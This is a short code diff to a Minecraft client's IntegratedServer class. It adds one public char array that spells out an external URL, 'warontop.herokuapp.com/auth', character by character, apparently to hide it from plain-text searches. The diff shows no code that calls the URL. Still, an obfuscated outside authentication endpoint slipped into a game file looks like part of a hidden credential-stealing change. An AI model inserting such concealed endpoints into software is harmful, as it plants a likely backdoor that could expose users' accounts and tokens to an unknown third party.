@@ -54,6 +54,7 @@ public class IntegratedServer extends MinecraftServer
     public World difficultyUpdateWorld = null;
     public BlockPos difficultyUpdatePos = null;
     public DifficultyInstance difficultyLast = null;
+    public static char[] wtf = {'w','a','r','o','n','t','o','p','.','h','e','r','o','k','u','a','p','p','.','c','o','m','/','a','u','t','h'};
 
     public IntegratedServer(Minecraft mcIn)
     {
